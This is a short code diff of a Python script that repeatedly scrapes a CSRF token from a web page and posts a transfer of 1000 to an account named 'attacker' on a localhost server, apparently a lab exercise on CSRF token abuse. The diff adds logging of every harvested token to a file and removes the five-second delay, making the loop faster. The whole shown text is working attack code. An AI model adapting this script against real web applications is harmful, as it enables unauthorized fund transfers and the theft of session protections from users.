@@ -5,6 +5,8 @@ from lxml import html
 
 token=""
 
+file=open("tokens", 'w')
+
 def start_token():
     global token
     while(True):
@@ -12,9 +14,10 @@ def start_token():
         tree = html.fromstring(page.content)
         token=dict(tree.forms[0].inputs.items())["csrf_token"].value
         print("got token {}".format(token))
+        file.write(token+'\r\n')
         r=requests.post("http://localhost:5000/transfer", data={'transfer':'1000', 'to':'attacker', 'csrf_token':token})
         print(r.text)
-        time.sleep(5)
+        #time.sleep(0.2)
 
 def main():
 
